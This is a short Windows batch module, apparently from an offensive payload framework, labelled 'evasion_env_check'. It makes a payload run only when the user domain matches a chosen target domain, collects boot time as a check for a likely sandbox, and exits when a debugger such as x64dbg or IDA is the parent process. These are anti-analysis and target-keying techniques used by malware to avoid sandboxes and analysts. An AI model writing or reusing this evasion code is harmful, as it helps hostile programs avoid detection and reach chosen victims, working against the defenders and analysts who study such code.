REM provides: evasion_env_check
REM depends: (none)
REM description: Validate target environment matches expected domain/user before proceeding

REM Only run on the target domain (set TARGET_DOMAIN in vars)
if not defined TARGET_DOMAIN goto :env_check_done
echo %USERDOMAIN% | findstr /i "%TARGET_DOMAIN%" >nul 2>nul || exit /b 0

:env_check_done

REM Check minimum uptime (recently booted = likely sandbox)
for /f "tokens=2 delims==" %%t in ('wmic os get LastBootUpTime /value 2^>nul ^| findstr "="') do (
    set "BOOT_TIME=%%t"
)

REM Check if running under debugger via parent process
wmic process where "ProcessId=%PPID%" get Name 2>nul | findstr /i "ollydbg x64dbg ida windbg" >nul 2>nul && exit /b 0
